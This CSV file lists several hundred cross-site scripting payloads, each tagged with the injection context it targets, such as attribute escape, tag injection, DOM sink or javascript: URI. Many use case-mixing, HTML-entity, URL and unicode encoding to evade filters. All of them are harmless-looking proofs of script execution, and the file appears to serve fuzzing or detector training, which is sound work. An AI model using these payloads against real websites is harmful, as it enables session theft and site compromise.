payload,context
"&#101;v&#97;l(""consol&#101;.log(docum&#101;nt.cooki&#101;)"")",dom_sink
%22 onerror=prompt(document.cookie) %22,attribute_escape
<scr	ipt>//console.log(document.cookie)</scr	ipt>,script_injection
<svG oNfoCus=coNsoLe.Log(1)>,tag_injection
document.write(%22<img src=x onerror=confirm(document.domain)>%22),dom_sink
""" onfocus=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
%3Csvg ontoggle=confirm(location.hash)/%3E,tag_injection
""" onfocus=prompt(1) autofocus=""",attribute_escape
""" oNfoCus=coNfiRm(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
j&#97;vascript:\u0061lert(location.hash),js_uri
%27 ontoggle=console.log(document.domain) %27,attribute_escape
"<img onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"""><Img onLoaD=aLerT('XSS')>",tag_injection
"""><svg onlo&#97;d=prompt('XSS')>",tag_injection
' onmouseenter=\u0061lert(document.cookie) ',attribute_escape
%3Cscript%3E//confirm(document.cookie)%3C/script%3E,script_injection
<script>\u0061lert(1)</script>,script_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink
<scRipT>cOnfIrm`loCatIon.haSh`</sCriPt>,script_injection
"<svg onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
<svg on&#101;rror=confirm(docum&#101;nt.cooki&#101;)>,tag_injection
""" oNtoGglE=aLerT(1) """,attribute_escape
%22><svg onbegin=confirm(1)>,tag_injection
""" onmouseenter=\u0061lert(1) """,attribute_escape
<scRipT>//alErt('XSS')</ScrIpt>,script_injection
%3Csvg onmouseover=console.log('XSS')/%3E,tag_injection
""" onload=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
"' onerror=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
"<svg onerror=confirm(String.fromCharCode(88,83,83))/>",tag_injection
"""><svg onerror=prompt(1)>",tag_injection
%22 onmouseenter=alert(1) %22,attribute_escape
"' onmouseenter=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
%22><svg onerror=confirm(document.domain)>,tag_injection
""" oNclIck=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
"<svg onclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
JavAscRipT:vOid(prOmpT(lOcaTioN.hAsh)),js_uri
%3Csvg onload=alert(location.hash)/%3E,tag_injection
<svg onmous&#101;&#101;nt&#101;r=prompt(1)/>,tag_injection
%22 onmouseenter=prompt(location.hash) %22,attribute_escape
j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in),js_uri
<script>/*/prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
"SetTimEouT(""ConSolE.lOg(LocAtiOn.HasH)"",0)",dom_sink
"setTimeout(%22confirm(%27XSS%27)%22,0)",dom_sink
eval(%22alert(location.hash)%22),dom_sink
%22 onclick=prompt(document.cookie) %22,attribute_escape
%22><svg onmouseenter=console.log(document.cookie)>,tag_injection
"""%3E%3Csvg onbegin=alert(document.domain)%3E",tag_injection
%27 onbegin=prompt(document.domain) %27,attribute_escape
"""><Svg onFocUs=ConFirM(dOcuMenT.dOmaIn)>",tag_injection
<svg ontoggl&#101;=&#97;l&#101;rt('XSS')/>,tag_injection
%3Csvg onmouseenter=prompt(document.domain)/%3E,tag_injection
' oNmoUseOveR=aLerT(dOcuMenT.cOokIe) ',attribute_escape
"' onlo&#97;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"""><Svg onMouSeoVer=coNfiRm(1)>",tag_injection
%3Csvg onerror=console.log(document.domain)/%3E,tag_injection
"<script>alert`String.fromCharCode(88,83,83)`</script>",script_injection
<svg onmouseenter=alert(document.domain)>,tag_injection
""" ontoggl&#101;=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
"""><svg onmouseenter=\u0061lert(location.hash)>",tag_injection
J&#97;VasCriPt:ConSolE.lOg(DocUmeNt.CooKie),js_uri
"""><svg onload=prompt(String.fromCharCode(88,83,83))>",tag_injection
<svG oNbeGin=alErt(doCumEnt.coOkiE)/>,tag_injection
"""><svg onclick=console.log(document.domain)>",tag_injection
' ontoggle=console.log(document.cookie) ',attribute_escape
""" oNerRor=coNfiRm(1) """,attribute_escape
"%22 onfocus=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
<svg onerror=prompt(1)/>,tag_injection
"""><Svg onMouSeoVer=coNsoLe.Log(doCumEnt.coOkiE)>",tag_injection
"""><Svg onMouSeoVer=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"""><Svg onLoaD=pRomPt(DocUmeNt.DomAin)>",tag_injection
%22><svg ontoggle=prompt(document.domain)>,tag_injection
"""%3E%3Csvg onmouseover=confirm('XSS')%3E",tag_injection
<svG oNmoUseOveR=aLerT(1)>,tag_injection
"""><svg onerror=alert(document.domain)>",tag_injection
j&#97;vascript:prompt(%27XSS%27),js_uri
"""><svg onmous&#101;&#101;nt&#101;r=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
' onlo&#97;d=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
"""><svg onerror=alert(String.fromCharCode(88,83,83))>",tag_injection
javascr	ipt:void(console.log(document.domain)),js_uri
"javascript:alert(String.fromCharCode(88,83,83))",js_uri
' oNfoCus=prOmpT('XSS') ',attribute_escape
""" ontoggle=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
""" oNclIck=prOmpT(dOcuMenT.dOmaIn) """,attribute_escape
<script>//&#97;l&#101;rt(docum&#101;nt.dom&#97;in)</script>,script_injection
javascript:prompt(%27XSS%27),js_uri
<svg onmouseenter=\u0061lert(document.domain)/>,tag_injection
<script>//prompt(location.hash)</script>,script_injection
%3Csvg onclick=alert(1)/%3E,tag_injection
""" onmous&#101;&#101;nt&#101;r=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
<svG oNclIck=alErt(doCumEnt.coOkiE)/>,tag_injection
"""%3E%3Csvg onfocus=console.log(document.domain)%3E",tag_injection
' oNerRor=coNfiRm('XSS') ',attribute_escape
"' onerror=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
<svg onload=confirm(document.domain)/>,tag_injection
"""%3E%3Csvg onload=confirm(document.cookie)%3E",tag_injection
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(StrIng.frOmCHarCodE(88,83,83))>"")",dom_sink
<scr	ipt>console.log('XSS')</scr	ipt>,script_injection
<svg onmouseover=confirm(1)>,tag_injection
%22><svg ontoggle=confirm(1)>,tag_injection
"""><Svg onErrOr=AleRt(DocUmeNt.DomAin)>",tag_injection
"""><svg onmouseover=alert(1)>",tag_injection
<svG oNerRor=prOmpT(lOcaTioN.hAsh)>,tag_injection
' onlo&#97;d=confirm(1) ',attribute_escape
"' oNbeGin=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
<scr	ipt>/*/console.log(1)</scr	ipt>,script_injection
<svG oNmoUseOveR=cOnfIrm(1)>,tag_injection
""" on&#101;rror=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
"javascript:void(prompt(String.fromCharCode(88,83,83)))",js_uri
<script>//prompt(document.cookie)</script>,script_injection
<svG oNclIck=coNfiRm(LocAtiOn.HasH)>,tag_injection
<imG oNloAd=AleRt(DocUmeNt.DomAin)/>,tag_injection
%3Csvg onmouseover=alert(1)/%3E,tag_injection
%27 ontoggle=prompt(location.hash) %27,attribute_escape
"""><svg ontoggle=\u0061lert('XSS')>",tag_injection
<svg onclick=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
<script>prompt(location.hash)</script>,script_injection
<script>\u0061lert`location.hash`</script>,script_injection
%3Cscript%3E/*/console.log(document.domain)%3C/script%3E,script_injection
""" oNerRor=alErt(loCatIon.haSh) """,attribute_escape
"%3Csvg ontoggle=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
""" onbegin=\u0061lert(1) """,attribute_escape
%3Csvg onmouseenter=confirm(document.cookie)%3E,tag_injection
' onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
"""%3E%3Csvg ontoggle=confirm(1)%3E",tag_injection
"%27 ontoggle=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
' onload=console.log(document.cookie) ',attribute_escape
%3Cscript%3Econfirm(document.domain)%3C/script%3E,script_injection
<svG oNbeGin=prOmpT(dOcuMenT.dOmaIn)/>,tag_injection
""" on&#101;rror=confirm(1) """,attribute_escape
<script>confirm('XSS')</script>,script_injection
<svg onmouseenter=console.log(document.domain)/>,tag_injection
%22 onbegin=confirm(location.hash) %22,attribute_escape
j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.cooki&#101;),js_uri
%3Cscript%3E/*/confirm(location.hash)%3C/script%3E,script_injection
"""%3E%3Csvg onfocus=confirm(location.hash)%3E",tag_injection
"""><Svg onMouSeoVer=prOmpT(dOcuMenT.cOokIe)>",tag_injection
""" onmouseenter=alert(location.hash) """,attribute_escape
%27 onerror=prompt(1) %27,attribute_escape
' oNfoCus=prOmpT(1) ',attribute_escape
<svG oNmoUseOveR=cOnsOle.loG(1)/>,tag_injection
%22 onerror=console.log(location.hash) %22,attribute_escape
%22 ontoggle=prompt(1) %22,attribute_escape
""" onfocus=\u0061lert(String.fromCharCode(88,83,83)) autofocus=""",attribute_escape
"%22 ontoggle=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
%3Csvg onerror=console.log(document.cookie)%3E,tag_injection
%22><svg onmouseover=confirm(document.cookie)>,tag_injection
<svg onload=alert(document.cookie)/>,tag_injection
<svg onfocus=confirm(document.cookie)/>,tag_injection
%27 onmouseenter=alert(document.cookie) %27,attribute_escape
"""><svg onbegin=console.log(1)>",tag_injection
<img onload=\u0061lert(1)/>,tag_injection
%3Csvg onmouseenter=alert(1)%3E,tag_injection
<svg onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
<svG oNclIck=alErt(1)/>,tag_injection
<svG oNerRor=coNsoLe.Log(1)/>,tag_injection
"<svG oNbeGin=prOmpT(STriNg.FroMChArCOde(88,83,83))/>",tag_injection
%3Cscript%3E//console.log(document.cookie)%3C/script%3E,script_injection
""" onmous&#101;&#101;nt&#101;r=confirm('XSS') """,attribute_escape
%27 onmouseenter=alert(1) %27,attribute_escape
' ontoggl&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
JavAscRipT:aLerT(1),js_uri
<svg onmous&#101;ov&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
' oNtoGglE=cOnfIrm(doCumEnt.coOkiE) ',attribute_escape
""" ontoggl&#101;=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
"%22 ontoggle=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
""" oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
"<svg onmouseover=alert(String.fromCharCode(88,83,83))>",tag_injection
JavAscRipT:pRomPt(1),js_uri
<svg onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
"""><svg onclick=console.log(1)>",tag_injection
""" oNclIck=alErt('XSS') """,attribute_escape
"%3Cscript%3E//prompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
%3Cscript%3E/*/prompt('XSS')%3C/script%3E,script_injection
<svG oNerRor=coNfiRm(DocUmeNt.DomAin)>,tag_injection
""" onload=alert(location.hash) """,attribute_escape
<svg onfocus=confirm(document.domain)/>,tag_injection
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
"""%3E%3Csvg ontoggle=console.log(location.hash)%3E",tag_injection
<svG oNmoUseOveR=cOnsOle.loG('XSS')/>,tag_injection
"""><svg onclick=\u0061lert(1)>",tag_injection
"""%3E%3Csvg onmouseenter=alert(String.fromCharCode(88,83,83))%3E",tag_injection
j&#97;v&#97;script:&#97;l&#101;rt(docum&#101;nt.dom&#97;in),js_uri
%22 onfocus=confirm(document.cookie) %22,attribute_escape
""" onmous&#101;ov&#101;r=prompt(docum&#101;nt.cooki&#101;) """,attribute_escape
"<scRipT>//coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection
"""><svg onlo&#97;d=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
javascript:void(confirm(%27XSS%27)),js_uri
<svG oNmoUseEntEr=AleRt(1)>,tag_injection
j&#97;v&#97;script:&#97;l&#101;rt(1),js_uri
"""%3E%3Csvg onclick=confirm(document.domain)%3E",tag_injection
' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
' onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape
javascript:prompt('XSS'),js_uri
<svG oNerRor=alErt(doCumEnt.doMaiN)/>,tag_injection
<svg onmouseover=prompt(1)/>,tag_injection
' onfocus=prompt(document.domain) ',attribute_escape
<svg ontoggl&#101;=confirm(1)/>,tag_injection
%3Csvg onfocus=console.log('XSS')/%3E,tag_injection
"<script>\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection
<svg onfocus=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection
%22 onfocus=console.log(%27XSS%27) autofocus=%22,attribute_escape
<svg onb&#101;gin=confirm(docum&#101;nt.cooki&#101;)>,tag_injection
""" oNmoUseEntEr=AleRt('XSS') """,attribute_escape
<svg onmouseenter=confirm(location.hash)>,tag_injection
"eval(""prompt(document.cookie)"")",dom_sink
<scr	ipt>/x/prompt(location.hash)</scr	ipt>,script_injection
""" oNerRor=prOmpT(1) """,attribute_escape
<svg onclick=alert(document.domain)/>,tag_injection
""" onfocus=&#97;l&#101;rt(1) """,attribute_escape
"""%3E%3Csvg onload=prompt(document.cookie)%3E",tag_injection
<svG oNbeGin=coNfiRm(1)/>,tag_injection
<svg onmouseenter=\u0061lert('XSS')/>,tag_injection
"""><Svg onMouSeeNteR=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"<svG oNfoCus=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<svG oNfoCus=coNsoLe.Log(doCumEnt.coOkiE)>,tag_injection
"""%3E%3Csvg onbegin=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
%22 ontoggle=alert(document.cookie) %22,attribute_escape
"<svg onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><svg onerror=confirm('XSS')>",tag_injection
"""><svg onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<svg onerror=console.log(1)>,tag_injection
""" oNclIck=coNsoLe.Log(doCumEnt.coOkiE) """,attribute_escape
JavAscRipT:vOid(alErt(doCumEnt.coOkiE)),js_uri
%22><svg onfocus=prompt(document.cookie)>,tag_injection
"<script>//confirm(String.fromCharCode(88,83,83))</script>",script_injection
<script>/*/consol&#101;.log('XSS')</script>,script_injection
"EvaL(""ConSolE.lOg(DocUmeNt.DomAin)"")",dom_sink
"<scRipT>/X/pRomPt(StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection
<svg on&#101;rror=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
"""><Svg onLoaD=cOnfIrm(loCatIon.haSh)>",tag_injection
<script>confirm(docum&#101;nt.cooki&#101;)</script>,script_injection
%22><svg onclick=confirm(document.cookie)>,tag_injection
<scRipT>/X/cOnsOle.loG(dOcuMenT.cOokIe)</sCriPt>,script_injection
"""><Svg onTogGle=alErt('XSS')>",tag_injection
<svg ontoggl&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
"<svG oNmoUseEntEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
<script>&#97;l&#101;rt`'XSS'`</script>,script_injection
<scr	ipt>/x/alert(location.hash)</scr	ipt>,script_injection
<svg onmouseover=\u0061lert(location.hash)/>,tag_injection
"""%3E%3Csvg onfocus=alert(String.fromCharCode(88,83,83))%3E",tag_injection
document.write(%22<img src=x onerror=console.log(location.hash)>%22),dom_sink
"""><svg on&#101;rror=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
"<scRipT>aLerT`STriNg.FroMChArCOde(88,83,83)`</scRipT>",script_injection
<svg onfocus=\u0061lert(document.domain)/>,tag_injection
' oNbeGin=alErt(loCatIon.haSh) ',attribute_escape
"""><Svg onLoaD=cOnsOle.loG(dOcuMenT.dOmaIn)>",tag_injection
"' ontoggle=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
<svG oNmoUseEntEr=AleRt(LocAtiOn.HasH)/>,tag_injection
javascript:void(prompt(1)),js_uri
%3Csvg ontoggle=prompt(document.cookie)/%3E,tag_injection
"""%3E%3Csvg onclick=confirm('XSS')%3E",tag_injection
<svG oNfoCus=prOmpT(1)/>,tag_injection
""" onerror=console.log(location.hash) """,attribute_escape
""" oNmoUseEntEr=AleRt(DocUmeNt.CooKie) """,attribute_escape
"setTimeout(""alert(document.cookie)"",0)",dom_sink
""" onerror=console.log(document.cookie) """,attribute_escape
"""><Svg onErrOr=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
""" onclick=alert('XSS') """,attribute_escape
"%22><svg onclick=prompt(String.fromCharCode(88,83,83))>",tag_injection
%22 onfocus=confirm(%27XSS%27) %22,attribute_escape
"EvaL(""ProMpt(doCumEnt.coOkiE)"")",dom_sink
<svg onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>,tag_injection
<svg onerror=\u0061lert(location.hash)>,tag_injection
<svG oNfoCus=alErt(doCumEnt.coOkiE)>,tag_injection
<script>/*/console.log(document.domain)</script>,script_injection
""" oNtoGglE=cOnfIrm(1) """,attribute_escape
%27 ontoggle=confirm(location.hash) %27,attribute_escape
"""><svg onmouseover=\u0061lert(document.domain)>",tag_injection
<imG oNloAd=ProMpt('XSS')>,tag_injection
%27 onerror=alert(1) %27,attribute_escape
%3Csvg onmouseenter=alert(location.hash)%3E,tag_injection
<svg onb&#101;gin=prompt(loc&#97;tion.h&#97;sh)>,tag_injection
' onerror=alert(location.hash) ',attribute_escape
<svg onload=confirm('XSS')>,tag_injection
<svg onclick=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
"<svG oNmoUseEntEr=ConFirM(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"eval(""\u0061lert(document.domain)"")",dom_sink
"""><svg on&#101;rror=&#97;l&#101;rt('XSS')>",tag_injection
"""%3E%3Csvg ontoggle=prompt(document.domain)%3E",tag_injection
"""><svg ontoggl&#101;=&#97;l&#101;rt('XSS')>",tag_injection
"""%3E%3Csvg onmouseenter=prompt(1)%3E",tag_injection
"' onmouseenter=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
<svg onmouseenter=confirm(%27XSS%27)>,tag_injection
<svG oNloAd=ProMpt(doCumEnt.doMaiN)/>,tag_injection
"SetTimEouT(""ConSolE.lOg(DocUmeNt.CooKie)"",0)",dom_sink
%22 onfocus=prompt(document.cookie) autofocus=%22,attribute_escape
<script>/x/\u0061lert(1)</script>,script_injection
J&#97;VasCriPt:ProMpt(doCumEnt.coOkiE),js_uri
%22 ontoggle=alert(%27XSS%27) %22,attribute_escape
"<svg onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
""" oNfoCus=coNsoLe.Log(1) auTofOcuS=""",attribute_escape
<svg ontoggle=prompt(1)>,tag_injection
javascr	ipt:void(console.log(location.hash)),js_uri
"' onbegin=alert(String.fromCharCode(88,83,83)) '",attribute_escape
"EvaL(""ConFirM(dOcuMenT.cOokIe)"")",dom_sink
' ontoggle=console.log(1) ',attribute_escape
' onlo&#97;d=consol&#101;.log('XSS') ',attribute_escape
"<script>confirm(String.fromCharCode(88,83,83))</script>",script_injection
%3Cimg onload=alert('XSS')/%3E,tag_injection
"""><Svg onErrOr=ConSolE.lOg('XSS')>",tag_injection
""" onmouseover=\u0061lert(location.hash) """,attribute_escape
<scr	ipt>confirm`1`</scr	ipt>,script_injection
%3Cscript%3Ealert(1)%3C/script%3E,script_injection
""" onfocus=\u0061lert(document.domain) autofocus=""",attribute_escape
<svg onbegin=alert(location.hash)/>,tag_injection
%22 onerror=confirm(document.cookie) %22,attribute_escape
<svG oNloAd=ConFirM(1)>,tag_injection
' oNloAd=ProMpt(1) ',attribute_escape
"<svg onmouseenter=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
<svg onfocus=prompt('XSS')/>,tag_injection
"""%3E%3Csvg onbegin=console.log('XSS')%3E",tag_injection
<svg ontoggl&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
"""%3E%3Csvg onerror=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
%3Csvg ontoggle=console.log('XSS')%3E,tag_injection
%27 onmouseenter=confirm(document.domain) %27,attribute_escape
"""%3E%3Csvg onfocus=confirm(document.cookie)%3E",tag_injection
"""><svg onmouseover=console.log(location.hash)>",tag_injection
<svG oNclIck=coNfiRm(1)/>,tag_injection
%3Csvg onfocus=alert(document.domain)%3E,tag_injection
"s&#101;tTim&#101;out(""consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink
<svG oNclIck=coNsoLe.Log(loCatIon.haSh)/>,tag_injection
""" ontoggle=prompt(1) """,attribute_escape
' onb&#101;gin=confirm('XSS') ',attribute_escape
<svg onload=alert(location.hash)/>,tag_injection
"%27 onmouseenter=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
document.write(%22<img src=x onerror=prompt(%27XSS%27)>%22),dom_sink
%22 onmouseenter=confirm(document.cookie) %22,attribute_escape
"document.write(""<img src=x onerror=alert(String.fromCharCode(88,83,83))>"")",dom_sink
"%3Csvg onmouseover=alert(String.fromCharCode(88,83,83))%3E",tag_injection
""" oNloAd=ConSolE.lOg(LocAtiOn.HasH) """,attribute_escape
"document.write(""<img src=x onerror=\u0061lert(location.hash)>"")",dom_sink
%27 onload=prompt(document.cookie) %27,attribute_escape
<svg onbegin=\u0061lert(location.hash)>,tag_injection
"""><svg onfocus=alert(document.cookie)>",tag_injection
"""><Svg onMouSeeNteR=aLerT(lOcaTioN.hAsh)>",tag_injection
"""><Svg onMouSeeNteR=cOnsOle.loG(dOcuMenT.cOokIe)>",tag_injection
%3Csvg onclick=alert('XSS')%3E,tag_injection
<svg onmous&#101;ov&#101;r=confirm(docum&#101;nt.cooki&#101;)>,tag_injection
eval(%22prompt(location.hash)%22),dom_sink
"""><svg onload=alert('XSS')>",tag_injection
%22 ontoggle=alert(document.domain) %22,attribute_escape
<svg onload=console.log(location.hash)/>,tag_injection
%3Csvg onbegin=prompt(document.domain)%3E,tag_injection
"""><Svg onMouSeeNteR=cOnsOle.loG(1)>",tag_injection
<svg ontoggl&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
%3Cscript%3Eprompt`document.domain`%3C/script%3E,script_injection
%3Csvg onerror=alert(1)%3E,tag_injection
""" onclick=confirm(1) """,attribute_escape
""" oNerRor=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape
JavAscRipT:vOid(coNsoLe.Log(doCumEnt.doMaiN)),js_uri
""" onmouseover=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
"""><svg onlo&#97;d=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
"""><svg onmous&#101;ov&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
"""><svg ontoggle=alert(String.fromCharCode(88,83,83))>",tag_injection
"""%3E%3Csvg onmouseenter=alert(document.cookie)%3E",tag_injection
' on&#101;rror=prompt('XSS') ',attribute_escape
%3Csvg onbegin=alert(1)%3E,tag_injection
eval(%22console.log(%27XSS%27)%22),dom_sink
%22 onload=alert(location.hash) %22,attribute_escape
j&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in),js_uri
%27 ontoggle=prompt(%27XSS%27) %27,attribute_escape
<svg onlo&#97;d=consol&#101;.log('XSS')/>,tag_injection
"setTimeout(%22console.log(document.domain)%22,0)",dom_sink
<svg onerror=confirm(%27XSS%27)/>,tag_injection
%3Csvg onbegin=confirm(document.domain)%3E,tag_injection
"""><svg onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
' onfocus=confirm(1) ',attribute_escape
"""><svg onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
<script>//alert(%27XSS%27)</script>,script_injection
""" oNfoCus=prOmpT('XSS') AutOfoCus=""",attribute_escape
<imG oNloAd=AleRt('XSS')>,tag_injection
"""><svg onmous&#101;&#101;nt&#101;r=prompt(1)>",tag_injection
<svg ontoggl&#101;=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
"javascript:void(confirm(String.fromCharCode(88,83,83)))",js_uri
<script>&#97;l&#101;rt(loc&#97;tion.h&#97;sh)</script>,script_injection
%3Csvg onfocus=prompt('XSS')%3E,tag_injection
""" onlo&#97;d=&#97;l&#101;rt('XSS') """,attribute_escape
"""%3E%3Csvg onload=console.log('XSS')%3E",tag_injection
<svG oNmoUseOveR=aLerT(lOcaTioN.hAsh)/>,tag_injection
<scRipT>pRomPt`DocUmeNt.CooKie`</ScrIpt>,script_injection
"EvaL(""ConFirM(1)"")",dom_sink
%27 onclick=confirm(document.cookie) %27,attribute_escape
<svG oNloAd=ProMpt(loCatIon.haSh)>,tag_injection
"' onload=console.log(String.fromCharCode(88,83,83)) '",attribute_escape
' oNmoUseOveR=cOnsOle.loG(lOcaTioN.hAsh) ',attribute_escape
%22><svg onerror=prompt(%27XSS%27)>,tag_injection
<svg onerror=console.log('XSS')>,tag_injection
""" oNfoCus=alErt(loCatIon.haSh) auTofOcuS=""",attribute_escape
"""%3E%3Csvg ontoggle=confirm(document.domain)%3E",tag_injection
%3Csvg onmouseover=prompt(document.domain)/%3E,tag_injection
%3Cscript%3E//alert(document.domain)%3C/script%3E,script_injection
' onclick=consol&#101;.log(1) ',attribute_escape
%3Csvg onload=confirm(document.cookie)%3E,tag_injection
<script>//confirm(1)</script>,script_injection
<svg on&#101;rror=&#97;l&#101;rt(1)>,tag_injection
"document.write(""%3Cimg src=x onerror=alert(location.hash)%3E"")",dom_sink
<scRipT>pRomPt`'XSS'`</sCriPt>,script_injection
"%22 ontoggle=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
""" onmouseenter=prompt(document.cookie) """,attribute_escape
' oNbeGin=alErt(doCumEnt.doMaiN) ',attribute_escape
%22 onbegin=console.log(%27XSS%27) %22,attribute_escape
"JavAscRipT:cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",js_uri
<svG oNclIck=prOmpT('XSS')>,tag_injection
"""><svg on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
<svG oNbeGin=alErt(doCumEnt.doMaiN)>,tag_injection
javascript:void(\u0061lert(location.hash)),js_uri
<svg onmouseenter=\u0061lert(1)/>,tag_injection
%3Csvg onload=confirm(location.hash)%3E,tag_injection
<svg onfocus=console.log(document.domain)/>,tag_injection
"<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"s&#101;tTim&#101;out(""prompt('XSS')"",0)",dom_sink
"%22><svg onerror=confirm(String.fromCharCode(88,83,83))>",tag_injection
"<svg onfocus=confirm(String.fromCharCode(88,83,83))>",tag_injection
